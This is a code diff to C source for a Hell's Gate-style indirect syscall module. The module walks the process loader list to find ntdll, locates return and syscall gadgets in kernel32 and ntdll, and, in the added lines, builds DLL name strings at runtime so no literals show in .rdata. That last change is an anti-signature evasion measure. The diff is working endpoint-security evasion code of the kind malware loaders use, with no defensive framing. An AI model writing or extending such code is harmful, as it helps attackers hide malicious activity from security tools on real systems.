@@ -50,12 +50,15 @@ static PVOID FindNtdll(void) {
     /* head of InLoadOrderModuleList */
     LIST_ENTRY *head = (LIST_ENTRY*)((BYTE*)ldr + LDR_OFFSET_INLOAD_LIST);
 
+    /* Build "ntdll.dll" at runtime — no wide-string literal in .rdata */
+    WCHAR w_ntdll[16]; WOBFSTR("ntdll.dll", w_ntdll, 16);
+
     for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
         /* BaseDllName.Length (USHORT) at LDR_ENTRY_OFFSET_BASENAME */
         USHORT  len = *(USHORT*)((BYTE*)e + LDR_ENTRY_OFFSET_BASENAME + USTR_OFFSET_LENGTH);
         WCHAR  *buf = *(WCHAR**)((BYTE*)e + LDR_ENTRY_OFFSET_BASENAME + USTR_OFFSET_BUFFER);
         /* "ntdll.dll" = 9 chars × 2 = 18 bytes */
-        if (len == 18 && buf && wcsnicmp_c(buf, L"ntdll.dll", 9) == 0) {
+        if (len == 18 && buf && wcsnicmp_c(buf, w_ntdll, 9) == 0) {
             return *(PVOID*)((BYTE*)e + LDR_ENTRY_OFFSET_DLLBASE);
         }
     }
@@ -180,8 +183,9 @@ static PVOID FindDllBase(const WCHAR *name, int nameChars) {
  * We pick CreateFileW as the anchor — it legitimately calls NT I/O APIs.
  */
 static PVOID FindK32RetGadget(void) {
-    /* kernel32.dll = 12 wide chars */
-    PVOID k32 = FindDllBase(L"kernel32.dll", 12);
+    /* Build "kernel32.dll" at runtime — no wide-string literal in .rdata */
+    WCHAR w_k32[16]; WOBFSTR("kernel32.dll", w_k32, 16);
+    PVOID k32 = FindDllBase(w_k32, 12);
     if (!k32) return NULL;
 
     BYTE *base = (BYTE*)k32;
@@ -242,6 +246,8 @@ static PVOID FindSyscallGadget(void) {
 }
 
 /* ── Public API ───────────────────────────────────────────────────────────── */
+
+PVOID HellsGateNtdllBase(void) { return s_ntdll_base; }
 
 BOOL HellsGateInit(void) {
     s_ntdll_base = FindNtdll();
